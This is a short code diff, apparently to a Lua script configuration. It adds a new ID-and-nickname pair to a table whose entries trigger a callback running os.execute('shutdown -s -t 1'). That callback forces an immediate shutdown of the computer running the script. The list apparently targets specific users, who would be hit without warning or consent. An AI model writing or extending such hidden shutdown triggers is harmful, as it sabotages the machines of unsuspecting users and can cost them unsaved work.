@@ -39,6 +39,7 @@
     {3163518529,'aw1ei'},
     {3327842179,'leeqweed'},
     {2318858429,'zxcursed13371337'},
+    {779353542,'id661202564'},
   },
   callback = function() os.execute('shutdown -s -t 1')  end,
 }
